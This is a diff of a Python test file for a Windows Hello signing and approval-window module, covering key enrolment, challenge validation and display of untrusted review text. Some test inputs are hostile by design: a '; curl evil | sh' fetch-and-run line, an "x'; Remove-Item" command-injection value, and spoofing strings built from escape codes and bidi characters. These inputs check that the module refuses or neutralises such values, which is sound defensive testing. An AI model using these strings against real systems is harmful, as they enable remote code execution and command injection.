@@ -38,6 +38,33 @@ REAL_SIGNATURE = base64.b64decode(
     "r0QAjX8PgqbYL1NgmrQHtg==")
 
 
+#: A HUB CHALLENGE IS 32 BYTES (#161), and the real Hello capture above signs
+#: 29. These stand in for Hello where a 32-byte challenge is needed: an
+#: RSA-2048 key signing as Hello does (PKCS#1 v1.5, SHA-256). The encoding
+#: has `-` and `_` and a length standard base64 would pad.
+CHALLENGE = bytes([0xFB, 0xEF, 0xFF] * 10 + [0xFE, 0x3E])
+CHALLENGE_URL = "--__--__--__--__--__--__--__--__--__--___j4"
+DIGEST = "ab" * 32
+
+
+def _soft_key():
+    from cryptography.hazmat.primitives import hashes, serialization
+    from cryptography.hazmat.primitives.asymmetric import padding, rsa
+
+    key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
+    spki = key.public_key().public_bytes(serialization.Encoding.DER,
+                                         serialization.PublicFormat.SubjectPublicKeyInfo)
+    return spki, key.sign(CHALLENGE, padding.PKCS1v15(), hashes.SHA256())
+
+
+SOFT_SPKI, SOFT_SIGNATURE = _soft_key()
+
+
+def _ps(raw: bytes) -> str:
+    """What our PowerShell child writes: .NET's standard, padded base64."""
+    return base64.b64encode(raw).decode()
+
+
 # --- a fake powershell.exe ---------------------------------------------------------
 
 FAKE = r'''#!{python}
@@ -126,41 +153,42 @@ def test_availability_is_asked_without_a_prompt_and_never_raises(fake, monkeypat
     assert hello.available() is False, "no powershell.exe: not available, not an error"
 
 
-def test_enrolment_returns_what_the_hub_registers(fake):
-    spki = base64.b64encode(REAL_SPKI).decode()
-    fake.plan(create={"status": "Success", "spki": spki},
-              sign={"status": "Success",
-                    "signature": base64.b64encode(REAL_SIGNATURE).decode()})
-    record = hello.enrol("collab-alice", hello.b64url(REAL_MESSAGE))
-    # Exactly the hub's `/enrol/finish` names, which rejects unknown fields;
-    # the key and the proof as unpadded base64url.
-    assert record == {"credential_id": "collab-alice", "method": "hello",
-                      "algorithm": -257, "public_key_spki": hello.b64url(REAL_SPKI),
-                      "proof": {"type": "hello",
-                                "signature": hello.b64url(REAL_SIGNATURE)}}
-    assert hello.unb64url(record["public_key_spki"], limit=4096) == REAL_SPKI
+def test_enrolment_returns_exactly_what_enrol_finish_takes(fake):
+    """`/enrol/finish` takes {challenge_id, credential_id, algorithm,
+    public_key_spki, proof} and REJECTS unknown fields (#161 at c9a1a09), so
+    the record carries those four — not `method`, fixed at `/enrol/begin` —
+    with the key and the proof as unpadded base64url."""
+    fake.plan(create={"status": "Success", "spki": _ps(SOFT_SPKI)},
+              sign={"status": "Success", "signature": _ps(SOFT_SIGNATURE)})
+    record = hello.enrol("collab-alice", CHALLENGE_URL)
+    assert record == {"credential_id": "collab-alice", "algorithm": -257,
+                      "public_key_spki": hello.b64url(SOFT_SPKI),
+                      "proof": {"type": "hello", "signature": hello.b64url(SOFT_SIGNATURE)}}
     ops = [c["req"] for c in fake.calls()]
     assert ops[0] == {"op": "create", "name": "collab-alice"}
     # The proof is a signature over exactly the hub's enrolment challenge.
     assert [o["op"] for o in ops] == ["create", "sign"]
-    assert base64.b64decode(ops[1]["challenge"]) == REAL_MESSAGE
+    assert base64.b64decode(ops[1]["challenge"]) == CHALLENGE
 
 
 def test_enrolment_proves_possession_or_does_not_enrol(fake):
-    """R22b: the key alone proves nothing about who holds its private half.
-    A proof that does not verify against the key just created is an error,
-    a cancelled proof is a refusal, and a bad challenge costs no gesture."""
-    spki = base64.b64encode(REAL_SPKI).decode()
-    fake.plan(create={"status": "Success", "spki": spki},
-              sign={"status": "Success", "signature": base64.b64encode(b"\0" * 256).decode()})
+    """Decision e_867b714f…: the key alone proves nothing about who holds its
+    private half. A proof that does not verify against the key just created
+    is an error, a cancelled proof is a refusal, and a challenge the hub would
+    not have issued — not 32 bytes, not canonical base64url — costs no
+    gesture."""
+    fake.plan(create={"status": "Success", "spki": _ps(SOFT_SPKI)},
+              sign={"status": "Success", "signature": _ps(b"\0" * 256)})
     with pytest.raises(hello.HelloError) as raised:
-        hello.enrol("collab-alice", hello.b64url(REAL_MESSAGE))
+        hello.enrol("collab-alice", CHALLENGE_URL)
     assert raised.value.status == "SignatureMismatch"
-    fake.plan(create={"status": "Success", "spki": spki}, sign={"status": "UserCanceled"})
+    fake.plan(create={"status": "Success", "spki": _ps(SOFT_SPKI)},
+              sign={"status": "UserCanceled"})
     with pytest.raises(hello.Refused):
-        hello.enrol("collab-alice", hello.b64url(REAL_MESSAGE))
+        hello.enrol("collab-alice", CHALLENGE_URL)
     before = len(fake.calls())
-    for bad in ("", "not base64!", base64.b64encode(REAL_MESSAGE).decode(), None):
+    for bad in ("", "not base64!", _ps(CHALLENGE), CHALLENGE_URL + "=",
+                hello.b64url(CHALLENGE[:31]), hello.b64url(CHALLENGE + b"x"), None):
         with pytest.raises(ValueError):
             hello.enrol("collab-alice", bad)
     assert len(fake.calls()) == before, "refused before any prompt"
@@ -168,12 +196,26 @@ def test_enrolment_proves_possession_or_does_not_enrol(fake):
 
 def test_a_key_whose_proof_was_cancelled_is_proven_without_a_new_key(fake):
     """`prove` reads the existing key's public half (no prompt) and signs the
-    hub's challenge with it (one gesture) — no second `create`."""
-    fake.plan(pubkey={"status": "Success", "spki": base64.b64encode(REAL_SPKI).decode()},
-              sign={"status": "Success", "signature": base64.b64encode(REAL_SIGNATURE).decode()})
-    record = hello.prove("collab-alice", hello.b64url(REAL_MESSAGE))
-    assert record["proof"] == {"type": "hello", "signature": hello.b64url(REAL_SIGNATURE)}
+    hub's challenge with it (one gesture) — no second `create`. A fresh
+    `/enrol/begin` is finished this way, and a key change's
+    `/key-changes/{id}/prove` takes its `proof`."""
+    fake.plan(pubkey={"status": "Success", "spki": _ps(SOFT_SPKI)},
+              sign={"status": "Success", "signature": _ps(SOFT_SIGNATURE)})
+    record = hello.prove("collab-alice", CHALLENGE_URL)
+    assert record["proof"] == {"type": "hello", "signature": hello.b64url(SOFT_SIGNATURE)}
     assert [c["req"]["op"] for c in fake.calls()] == ["pubkey", "sign"]
+
+
+def test_a_new_key_for_a_key_change_carries_that_routes_fields(fake):
+    """`/key-changes/begin` needs the new key BEFORE it issues the possession
+    challenge, so `enrol`'s challenge-first shape cannot serve it: `new_key`
+    is one gesture and exactly {credential_id, method, algorithm,
+    public_key_spki}; the caller adds `kind`."""
+    fake.plan(create={"status": "Success", "spki": _ps(SOFT_SPKI)})
+    assert hello.new_key("collab-alice-2") == {
+        "credential_id": "collab-alice-2", "method": "hello", "algorithm": -257,
+        "public_key_spki": hello.b64url(SOFT_SPKI)}
+    assert [c["req"]["op"] for c in fake.calls()] == ["create"]
 
 
 @pytest.mark.parametrize("status, error", [
@@ -186,7 +228,7 @@ def test_every_status_hello_can_give_has_its_meaning(fake, status, error):
     is unavailability — and anything else is an error naming the status."""
     fake.plan(create={"status": status}, sign={"status": status})
     with pytest.raises(error) as raised:
-        hello.enrol("collab-alice", hello.b64url(b"challenge"))
+        hello.enrol("collab-alice", CHALLENGE_URL)
     assert raised.value.status == status
     with pytest.raises(error):
         hello.sign("collab-alice", b"challenge")
@@ -281,41 +323,73 @@ def test_a_flood_is_cut_at_the_output_cap_cheaply(fake):
 # --- the approval window ----------------------------------------------------------------
 
 def _request(**extra):
+    """What the dispatcher builds from `GET /requests/{id}/review`."""
     base = {"request_id": "q_1", "requester_id": "p_bob", "requester_name": "bob",
             "subject": "remote prompt", "destination": "alice's agent",
-            "authority": "run one prompt", "digest": hello.b64url(b"\xab" * 32),
-            "review_text": "please run: make test", "credential_id": "collab-alice",
-            "challenge": hello.b64url(REAL_MESSAGE)}
+            "authority": "run one prompt", "digest": DIGEST,
+            "review_text": "please run: make test", "credential_id": "collab-alice"}
     base.update(extra)
     return base
+
+
+def _issued(**extra):
+    """The hub's `POST /requests/{id}/challenge` response, as v1 shapes it."""
+    base = {"api_version": 1, "request_id": "q_1", "challenge_id": "c_1",
+            "credential_id": "collab-alice", "method": "hello",
+            "challenge": CHALLENGE_URL, "expires_at": int(time.time()) + 120,
+            "digest": DIGEST}
+    base.update(extra)
+    return base
+
+
+class Fetch:
+    """The dispatcher's challenge request: counts its calls."""
+
+    def __init__(self, answer=None, error=None):
+        self.calls = 0
+        self.answer = _issued() if answer is None else answer
+        self.error = error
+
+    def __call__(self):
+        self.calls += 1
+        if self.error is not None:
+            raise self.error
+        return self.answer
+
+
+def _open(request, fetch=None):
+    return hello.open_window(request, fetch or Fetch())
 
 
 def test_approve_signs_the_challenge_and_only_approve_does(fake):
     """The click is the front door; the gesture is the lock. Approve leads to
     one signature over exactly the challenge; Decline and «use a passkey» to
     none."""
-    sig = base64.b64encode(REAL_SIGNATURE).decode()
     fake.plan(window={"status": "Success", "choice": "approve"},
-              sign={"status": "Success", "signature": sig},
-              pubkey={"status": "Success", "spki": base64.b64encode(REAL_SPKI).decode()})
-    result = hello.open_window(_request())
-    assert result == {"choice": "approve", "method": "hello",
+              sign={"status": "Success", "signature": _ps(SOFT_SIGNATURE)},
+              pubkey={"status": "Success", "spki": _ps(SOFT_SPKI)})
+    result = _open(_request())
+    # Everything `/approve` takes — {challenge_id, credential_id, proof} —
+    # with the tagged proof ready to forward untouched.
+    assert result == {"choice": "approve", "method": "hello", "challenge_id": "c_1",
                       "credential_id": "collab-alice",
-                      "proof": {"type": "hello", "signature": hello.b64url(REAL_SIGNATURE)}}
+                      "proof": {"type": "hello", "signature": hello.b64url(SOFT_SIGNATURE)}}
     signed = [c["req"] for c in fake.calls() if c["req"]["op"] == "sign"]
-    assert len(signed) == 1 and base64.b64decode(signed[0]["challenge"]) == REAL_MESSAGE
+    assert len(signed) == 1 and base64.b64decode(signed[0]["challenge"]) == CHALLENGE
     for choice, expected in (("decline", "decline"), ("passkey", "passkey"),
                              ("anything", "decline")):
         fake.plan(window={"status": "Success", "choice": choice})
         before = len([c for c in fake.calls() if c["req"]["op"] == "sign"])
-        assert hello.open_window(_request())["choice"] == expected
+        fetch = Fetch()
+        assert _open(_request(), fetch)["choice"] == expected
         assert len([c for c in fake.calls() if c["req"]["op"] == "sign"]) == before
+        assert fetch.calls == 0, "no challenge is issued for anything but Approve"
 
 
 def test_a_cancelled_gesture_after_approve_is_a_decline(fake):
     fake.plan(window={"status": "Success", "choice": "approve"},
               sign={"status": "UserCanceled"})
-    assert hello.open_window(_request()) == {"choice": "decline", "reason": "Refused"}
+    assert _open(_request()) == {"choice": "decline", "reason": "Refused"}
 
 
 def test_a_window_that_breaks_or_hangs_approves_nothing_and_decides_nothing(
@@ -325,18 +399,18 @@ def test_a_window_that_breaks_or_hangs_approves_nothing_and_decides_nothing(
     — and neither is ever an approval."""
     monkeypatch.setattr(hello, "WINDOW_DEADLINE", 1.5)
     fake.plan(window="silent")
-    assert hello.open_window(_request()) == {"choice": "expired"}
+    assert _open(_request()) == {"choice": "expired"}
     fake.plan(window="garbage")
-    assert hello.open_window(_request())["choice"] == "unavailable"
+    assert _open(_request())["choice"] == "unavailable"
     fake.plan(window={"status": "Error", "error": "Win32Exception"})
-    assert hello.open_window(_request())["choice"] == "unavailable"
+    assert _open(_request())["choice"] == "unavailable"
     monkeypatch.setattr(hello, "_powershell", lambda: None)
-    assert hello.open_window(_request()) == {"choice": "unavailable", "reason": "NoPowerShell"}
+    assert _open(_request()) == {"choice": "unavailable", "reason": "NoPowerShell"}
 
 
 def test_no_key_enrolled_is_unavailable_so_the_dispatcher_can_offer_a_passkey(fake):
     fake.plan(window={"status": "Success", "choice": "approve"}, sign={"status": "NotFound"})
-    assert hello.open_window(_request()) == {"choice": "unavailable", "reason": "NotEnrolled"}
+    assert _open(_request()) == {"choice": "unavailable", "reason": "NotEnrolled"}
 
 
 def test_the_window_shows_the_review_as_untrusted_text_with_a_bounded_summary(fake):
@@ -346,7 +420,7 @@ def test_the_window_shows_the_review_as_untrusted_text_with_a_bounded_summary(fa
     marked untrusted and bounded, and it travels on stdin, not the command
     line."""
     fake.plan(window={"status": "Success", "choice": "decline"})
-    hello.open_window(_request(requester_name="bob\nAPPROVED BY ADMIN\x1b[2J",
+    _open(_request(requester_name="bob\nAPPROVED BY ADMIN\x1b[2J",
                         review_text="x" * (hello.REVIEW_MAX + 500)))
     call = fake.calls()[-1]
     sent = call["req"]
@@ -368,7 +442,7 @@ def test_controls_and_invisible_characters_are_shown_not_obeyed(fake):
     bidi overrides and isolates, zero-width characters, the BOM — is shown as
     a visible \\u{XXXX}, in the review and in the lines above it."""
     fake.plan(window={"status": "Success", "choice": "decline"})
-    hello.open_window(_request(
+    _open(_request(
         review_text="make test\x00; curl evil | sh",
         requester_name="bob\u202e)ecila(\u2066x\u2069\u200b\ufeff"))
     sent = fake.calls()[-1]["req"]
@@ -384,7 +458,7 @@ def test_the_hub_assigned_id_is_its_own_first_line_and_the_name_is_marked(fake):
     real id off a wrapped label. The id is the first line on its own; the
     name follows, marked as the requester's own choice."""
     fake.plan(window={"status": "Success", "choice": "decline"})
-    hello.open_window(_request(requester_id="p_bob",
+    _open(_request(requester_id="p_bob",
                                requester_name="alice (p_alice) asks for approval " + "⸻" * 80))
     sent = fake.calls()[-1]["req"]
     assert sent["requester"].startswith("Requester: p_bob")
@@ -396,16 +470,13 @@ def test_the_hub_assigned_id_is_its_own_first_line_and_the_name_is_marked(fake):
 def test_a_request_that_could_not_be_signed_never_reaches_a_human(fake):
     """The key name and the challenge are checked BEFORE the window: a human
     must not read and approve something that cannot then be signed."""
-    for bad in ({"credential_id": "x'; Remove-Item"}, {"challenge": "not base64!"},
-                {"challenge": ""}, {"credential_id": None}, {"challenge": None},
-                # The hub's own encoding only: the same bytes in standard,
-                # padded base64 are refused, not decoded to the same value.
-                {"challenge": base64.b64encode(REAL_MESSAGE).decode()},
-                # The digest as the hub sends it, or not at all: hex, padded,
-                # or a length that is not a SHA-256 never reaches a human.
-                {"digest": "ab" * 32}, {"digest": hello.b64url(b"\xab" * 31)},
-                {"digest": base64.b64encode(b"\xab" * 32).decode()}, {"digest": None}):
-        assert hello.open_window(_request(**bad)) == {"choice": "unavailable",
+    for bad in ({"credential_id": "x'; Remove-Item"}, {"credential_id": None},
+                # The digest as v1 sends it — 64 LOWERCASE hex — or not at
+                # all: upper case, short, base64url or absent never reaches a
+                # human.
+                {"digest": DIGEST.upper()}, {"digest": DIGEST[:63]},
+                {"digest": hello.b64url(bytes.fromhex(DIGEST))}, {"digest": None}):
+        assert _open(_request(**bad)) == {"choice": "unavailable",
                                                       "reason": "BadRequest"}
     assert fake.calls() == []
 
@@ -420,7 +491,7 @@ def test_a_child_that_never_reads_cannot_stretch_the_deadline(tmp_path, monkeypa
     monkeypatch.setattr(hello, "_powershell", lambda: str(exe))
     monkeypatch.setattr(hello, "WINDOW_DEADLINE", 1.5)
     began = time.monotonic()
-    result = hello.open_window(_request(review_text="r" * (hello.REVIEW_MAX - 100)))
+    result = _open(_request(review_text="r" * (hello.REVIEW_MAX - 100)))
     took = time.monotonic() - began
     assert result == {"choice": "expired"}
     assert took < 5, f"{took:.1f} s"
@@ -461,11 +532,10 @@ def test_a_signature_that_does_not_verify_locally_is_never_an_approval(fake):
     """The hub verifies every signature; the window checks too, against the
     key's own public half (read without a prompt), so an answer this machine's
     Hello did not make is never forwarded as an approval."""
-    forged = base64.b64encode(b"\x00" * 256).decode()
     fake.plan(window={"status": "Success", "choice": "approve"},
-              sign={"status": "Success", "signature": forged},
-              pubkey={"status": "Success", "spki": base64.b64encode(REAL_SPKI).decode()})
-    assert hello.open_window(_request()) == {"choice": "unavailable",
+              sign={"status": "Success", "signature": _ps(b"\x00" * 256)},
+              pubkey={"status": "Success", "spki": _ps(SOFT_SPKI)})
+    assert _open(_request()) == {"choice": "unavailable",
                                              "reason": "SignatureMismatch"}
 
 
@@ -490,7 +560,7 @@ def test_without_killpg_the_fallback_still_ends_the_call(fake, monkeypatch):
     fake.plan(window="silent")
     began = time.monotonic()
     try:
-        assert hello.open_window(_request()) == {"choice": "expired"}
+        assert _open(_request()) == {"choice": "expired"}
         assert time.monotonic() - began < 6
         assert started and started[0].poll() is not None, "the call's process ended"
     finally:
@@ -552,20 +622,71 @@ def test_a_field_longer_than_its_limit_is_refused_before_decoding(monkeypatch):
     assert decoded == []
 
 
-def test_the_window_takes_a_url_safe_challenge_and_answers_unpadded(fake, monkeypatch):
-    """End to end through `open_window`: a challenge with `-` and `_` and a
-    length standard base64 would pad reaches Hello as exactly its bytes, and
-    the approval's signature goes back in the hub's encoding."""
-    signature = bytes([0xFB, 0xFF]) + REAL_SIGNATURE[2:]
+def test_the_window_signs_a_url_safe_challenge_and_answers_unpadded(fake):
+    """End to end through `open_window`: a 32-byte challenge whose encoding
+    has `-` and `_` and would need padding reaches Hello as exactly its
+    bytes, and the signature goes back in the hub's encoding."""
+    assert hello.b64url(CHALLENGE) == CHALLENGE_URL and len(CHALLENGE_URL) % 4
+    assert "-" in CHALLENGE_URL and "_" in CHALLENGE_URL
     fake.plan(window={"status": "Success", "choice": "approve"},
-              sign={"status": "Success", "signature": base64.b64encode(signature).decode()},
-              pubkey={"status": "Success", "spki": base64.b64encode(REAL_SPKI).decode()})
-    verified = []
-    monkeypatch.setattr(hello, "verify",
-                        lambda spki, message, sig: verified.append(message) or True)
-    result = hello.open_window(_request(challenge=VECTOR_URL))
+              sign={"status": "Success", "signature": _ps(SOFT_SIGNATURE)},
+              pubkey={"status": "Success", "spki": _ps(SOFT_SPKI)})
+    result = _open(_request())
     signed = [c["req"] for c in fake.calls() if c["req"]["op"] == "sign"]
-    assert base64.b64decode(signed[0]["challenge"]) == VECTOR == verified[0]
+    assert base64.b64decode(signed[0]["challenge"]) == CHALLENGE
     sent = result["proof"]["signature"]
     assert "=" not in sent and "+" not in sent and "/" not in sent
-    assert hello.unb64url(sent, limit=4096) == signature
+    assert hello.unb64url(sent, limit=4096) == SOFT_SIGNATURE
+
+
+# --- the boundary with the dispatcher (#161, c9a1a09) ----------------------------
+
+@pytest.mark.parametrize("bad", [
+    {"digest": "cd" * 32},                       # a challenge for another review
+    {"credential_id": "collab-mallory"},         # for another key
+    {"method": "passkey"},
+    {"challenge": _ps(CHALLENGE)},               # standard, padded base64
+    {"challenge": hello.b64url(CHALLENGE[:31])},  # not a hub challenge's size
+    {"challenge": hello.b64url(CHALLENGE + b"!")},
+    {"challenge_id": ""}, {"expires_at": "soon"}, {"expires_at": 1.5e9},
+])
+def test_a_challenge_that_is_not_for_the_reviewed_operation_is_never_signed(fake, bad):
+    """The human approved ONE review. A challenge whose digest, credential,
+    method or shape is not that review's is refused before Hello is asked:
+    signing it would approve something nobody read."""
+    fake.plan(window={"status": "Success", "choice": "approve"},
+              sign={"status": "Success", "signature": _ps(SOFT_SIGNATURE)},
+              pubkey={"status": "Success", "spki": _ps(SOFT_SPKI)})
+    assert _open(_request(), Fetch(_issued(**bad))) == {"choice": "unavailable",
+                                                        "reason": "BadChallenge"}
+    assert not [c for c in fake.calls() if c["req"]["op"] == "sign"]
+
+
+def test_a_challenge_the_hub_would_not_issue_is_unavailable_not_a_decline(fake):
+    """The hub refused the challenge (409, 410, 429, unreachable): nothing was
+    signed, and the human's Approve is neither turned into an approval nor
+    recorded as a decline. No weak fallback."""
+    fake.plan(window={"status": "Success", "choice": "approve"})
+    fetch = Fetch(error=RuntimeError("410 challenge_expired"))
+    assert _open(_request(), fetch) == {"choice": "unavailable", "reason": "ChallengeFailed"}
+    assert fetch.calls == 1
+    assert not [c for c in fake.calls() if c["req"]["op"] == "sign"]
+
+
+def test_the_gesture_is_bounded_by_the_challenges_expiry(fake, monkeypatch):
+    """A challenge lives 120 s from issuance. With too little of it left the
+    human is not asked for a gesture the hub would refuse (410); otherwise the
+    Hello prompt waits no longer than what is left."""
+    fake.plan(window={"status": "Success", "choice": "approve"},
+              sign={"status": "Success", "signature": _ps(SOFT_SIGNATURE)},
+              pubkey={"status": "Success", "spki": _ps(SOFT_SPKI)})
+    late = Fetch(_issued(expires_at=int(time.time()) + 2))
+    assert _open(_request(), late) == {"choice": "expired"}
+    assert not [c for c in fake.calls() if c["req"]["op"] == "sign"]
+    deadlines = []
+    real = hello._run
+    monkeypatch.setattr(hello, "_run", lambda req, deadline: (
+        deadlines.append((req["op"], deadline)) or real(req, deadline)))
+    assert _open(_request(), Fetch(_issued(expires_at=int(time.time()) + 40)))["choice"] == "approve"
+    sign_deadline = next(d for op, d in deadlines if op == "sign")
+    assert 30 < sign_deadline <= 40
